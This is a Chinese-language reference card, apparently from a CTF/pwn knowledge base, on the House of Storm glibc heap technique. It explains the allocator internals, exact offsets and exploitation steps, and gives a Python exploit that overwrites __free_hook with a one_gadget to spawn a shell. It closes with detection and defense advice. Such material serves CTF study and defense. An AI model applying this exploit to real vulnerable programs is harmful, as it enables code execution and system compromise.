---
id: binary-pwn-heap-house-of-storm-unsorted-largebin-fake-chunk
title: House of Storm：unsorted bin + large bin 双写伪造任意地址 chunk 劫持 __free_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-storm-unsorted-largebin-fake-chunk
aliases:
- House of Storm
- house of storm
- storm 堆手法
- unsortedbin+largebin 伪造 chunk
- __free_hook one_gadget
- catchme
tags:
- pwn
- heap
- glibc
- house-of-storm
- unsorted-bin
- large-bin
- free-hook
- one-gadget
- uaf
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: glibc < 2.30（2.30 起 smallbin 取出增加 bck->fd != victim 检查）
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T20:02:00+08:00'
  notes: 已对照原文（无图片）核对：unsorted/large bin 插入源码、unsorted->bk=fake、large->bk=fake+8、large->bk_nextsize=fake-0x18-5、fake+0x3 伪 size、fake+0x18 写 victim、fake=__free_hook-0x18、one_gadget 0x4F302、edit 三次限制与 exp 均一致；2.30 smallbin bck->fd!=victim 检查导致失效与 affected_versions 一致。小注：fake chunk 的 chunk2mem 是 __free_hook-8，edit 的 tag 在 +8 才落到 __free_hook，卡内『user data 落在 __free_hook』表述略偏 8 字节，不影响 PoC。未改 affected_versions；frontmatter无sources/source_url。
---

## 一句话结论

House of Storm 把 unsorted bin attack 与 large bin attack 组合起来：通过 UAF 改写一个 unsorted chunk 的 `bk` 和一个 largebin chunk 的 `bk`/`bk_nextsize`，让 glibc 在把 chunk 插入 bin 的过程中，在目标地址（如 `__free_hook - 0x18`）附近写入 chunk 指针并伪造出 size 字段，从而把一个 fake chunk 链入 unsorted bin；随后从 unsorted bin 申请该 fake chunk 即可拿到目标地址的写能力，覆盖 `__free_hook` 为 one_gadget 并触发 `free` 提权；该手法在 glibc 2.30 起因 smallbin 取出时的 `bck->fd != victim` 双向链表检查而失效。

## 原理

- **前提**：存在 UAF/堆重叠，能编辑已释放 chunk 的 `bk` 等指针；能制造一个 unsorted bin chunk（`victim`）和一个 largebin chunk；有 libc 泄漏；目标 glibc 版本低于 2.30（原文测试 libc 2.27，`__free_hook` 仍可用）。
- **unsorted bin attack 部分**：从 unsorted bin 取出 chunk 时，glibc 执行：
  ```c
  unsorted_chunks(av)->bk = bck;   // bck = victim->bk
  bck->fd = unsorted_chunks(av);
  ```
  若把 `victim->bk` 改成 `fake_chunk`，则会在 `fake_chunk + 0x10`（fd 偏移）写入 unsorted bin 头指针；这一步把目标地址纳入链表语义。
- **large bin attack 部分**：当 unsorted chunk 被归入 large bin 且其 size 大于原 largebin chunk 时，走“插入纵向链表”分支：
  ```c
  unsorted_chunk->fd_nextsize = largebin_chunk;
  unsorted_chunk->bk_nextsize = largebin_chunk->bk_nextsize;
  largebin_chunk->bk_nextsize = unsorted_chunk;
  unsorted_chunk->bk_nextsize->fd_nextsize = unsorted_chunk; // 在 fake_chunk+0x3 写 victim
  bck = largebin_chunk->bk;                                  // bck = fake_chunk+0x8
  ...
  unsorted_chunk->bk = bck;
  unsorted_chunk->fd = largebin_chunk;
  largebin_chunk->bk = unsorted_chunk;
  bck->fd = unsorted_chunk;                                  // fake_chunk+0x18 = victim
  ```
  通过控制 `largebin_chunk->bk = fake_chunk + 0x8` 和 `largebin_chunk->bk_nextsize = fake_chunk - 0x18 - 5`，可以在 `fake_chunk + 0x3` 写入 victim 指针（充当 size 字段的低字节），并在 `fake_chunk + 0x18` 写入 victim（充当 bk），使 fake chunk 看起来像一个合法的 unsorted/large bin 节点。
- **为什么是两个 attack 的组合**：单独 unsorted bin attack 只能往目标写一个 libc 指针，且新版本有检查；单独 large bin attack 只能写堆指针/有限位置。Storm 利用两条插入路径的写操作，在目标地址构造出“size 合理、fd/bk 自洽”的 fake chunk，并把它链入 unsorted bin；之后一次 `malloc` 就能从 unsorted bin 取出该 fake chunk，返回指向目标的 mem 指针。
- **利用落点**：原文把 `fake_chunk = libc_base + __free_hook - 0x18`，申请出 fake chunk 后写入 one_gadget（`libc + 0x4F302`），再 `free` 一个 chunk 触发 `__free_hook` 提权。`-0x18` 是为了让 fake chunk 的 user data 落在 `__free_hook` 上（chunk 头 0x10 + 0x8 偏移关系）。
- **版本边界**：glibc 2.30 起在 smallbin 取出路径增加：
  ```c
  bck = victim->bk;
  if (__glibc_unlikely (bck->fd != victim))
      malloc_printerr("malloc(): smallbin double linked list corrupted");
  ```
  该反向检查使伪造的 fake chunk 无法通过，House of Storm 在 2.30+ 失效；此外 2.34+ 移除了 `__free_hook`，落点也需改为 FSOP/其他目标。
- **与相邻手法的区别**：House of Botcake 用 unsorted bin 实现 double free 后打 tcache；House of Storm 的重点是“伪造任意地址 chunk 并申请出来”；largebin attack 单独只写一个堆指针，Storm 需要 unsorted+large 两条路径协同。

## 触发条件

- 目标为 glibc < 2.30 的 Linux 程序（原文 libc 2.27），存在 UAF/堆重叠且能编辑已释放 chunk 的 `bk`/`bk_nextsize`。
- 能构造 unsorted bin chunk 与 largebin chunk，并能控制它们的释放顺序与大小关系（unsorted chunk 的 size 要大于 largebin chunk，才能走纵向插入分支）。
- 有 libc 地址泄漏；目标地址（`__free_hook` 等）在 glibc 中仍存在且可写；有一次从 unsorted bin 的分配和一次触发函数指针的 `free`。
- 堆布局允许至少 3 次编辑/写指针（原文题目限制 edit 三次，正好用于伪造 unsorted `bk`、large `bk`/`bk_nextsize`）。

## 利用步骤

1. **泄漏 libc**：制造 unsorted bin chunk，利用 UAF/`show` 读出 `main_arena` 相关指针，算出 libc 基址。
2. **准备 unsorted chunk**：分配并释放一个大小合适的 chunk，使其进入 unsorted bin；通过 UAF 把它的 `bk` 改为 `fake_chunk`（`__free_hook - 0x18`）。
3. **准备 largebin chunk**：分配一个较大的 chunk 并释放进 large bin（或先放入 large bin），通过 UAF 改写它的 `bk = fake_chunk + 0x8`、`bk_nextsize = fake_chunk - 0x18 - 5`。
4. **触发插入**：执行一次 `malloc`/`free` 让 unsorted chunk 被归类进 large bin，触发上述两条写路径，在 `fake_chunk` 处伪造出 size/fd/bk 并使它进入 unsorted bin。
5. **申请 fake chunk**：再次 `malloc` 从 unsorted bin 取出 fake chunk，返回的 user 指针落在 `__free_hook`（或目标地址）。
6. **写目标**：把 one_gadget 地址写入 `__free_hook`（或改写其他函数指针）。
7. **触发**：`free` 一个受控 chunk，跳入 one_gadget 获得 shell；若 one_gadget 约束不满足，改用 `setcontext`/`system` 链。

## PoC

原文最终 exp 的关键片段（libc 2.27，未在本机复跑）：

```python
# 1) 泄漏 libc
add(1); add(1); delete(0); show(0)
lib = u64(io.recv(6).ljust(8, b"\x00")) - 0x3ebca0

# 2) 堆布局：0x430 / 0x440 / 0x48(calloc)，制造 unsorted + largebin
def pwn3():
    add(2)          # large
    add(3)          # small
    add(1)          # unsorted candidate
    add(3)
    delete(2)
    delete(0)
    clear(0)
    add(2)          # 放入 largebin
    delete(0)       # unsortedbin 归位
    fake_chunk = lib + libc.sym["__free_hook"] - 0x18
    edit(0, p64(fake_chunk))                                  # unsorted->bk = fake
    edit(2, p64(fake_chunk + 8) + p64(0) + p64(fake_chunk - 0x18 - 5))  # large->bk / bk_nextsize
    add(3)          # 触发插入，fake chunk 进入 unsortedbin
    ogg = lib + 0x4F302
    edit(4, p64(ogg))   # 申请到 __free_hook 并写 one_gadget
    delete(4)           # 触发 __free_hook
```

```text
关键公式：
  fake_chunk = libc_base + __free_hook - 0x18
  unsorted_chunk->bk = fake_chunk
  largebin_chunk->bk = fake_chunk + 0x8
  largebin_chunk->bk_nextsize = fake_chunk - 0x18 - 5
```

## 变体与关联

- **相邻堆手法**：House of Botcake（unsorted bin double free → tcache 投毒，见 [[binary-pwn-heap-house-of-botcake-tcache-poison]]）、House of Apple 2（FSOP，见 [[binary-pwn-heap-house-of-apple-2-stderr-fsop]]）、largebin attack + IO list（见 [[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]）、unsorted bin leak（见 [[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]）。
- **落点变体**：`__free_hook`→one_gadget（2.27/2.29）、`__malloc_hook`、`_IO_list_all`/FSOP（2.34+ 无 hook）、`exit_funcs`、GOT（Partial RELRO）、`setcontext` 链。
- **版本变体**：2.30+ 的 smallbin 双向链表检查使 Storm 失效，可改打 largebin attack 的其他写点、House of Botcake、tcache poisoning、FSOP；2.32+ 引入 safe-linking，需泄漏堆地址并伪造指针。
- **关联**：[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]、[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]、[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]。
- **边界**：glibc 2.30+ 失效；2.34+ 无 `__free_hook`；需要精确堆布局与 libc 泄漏；one_gadget 约束可能不满足；现代分配器检查（safe-linking、tcache key、double-free 检查）会增加难度。

## 检测与防御

- **对 CTF/分析者**：先确认 glibc 版本（`libc.so.6`/`__libc_version`、`malloc_assert` 字符串），2.30+ 不要尝试 Storm；用 `seccomp`/`checksec` 确认可利用落点；在 `malloc`/`free` 下断点观察 bin 链表写入。
- **对防御方/开发者**：升级 glibc 到包含 smallbin 检查的版本；启用 safe-linking、tcache key、`__free_hook` 移除（2.34+）；编译时启用 `FORTIFY_SOURCE`、ASLR/PIE、Full RELRO；避免 UAF/堆重叠，使用安全分配器或内存安全语言。
- **监控**：堆元数据异常（bk/fd 指向非堆区域、size 字段与 chunk 不匹配）、`__free_hook` 被写、one_gadget 特征、异常 `free` 调用链；CTF 外可结合 glibc malloc 检查日志与崩溃转储。
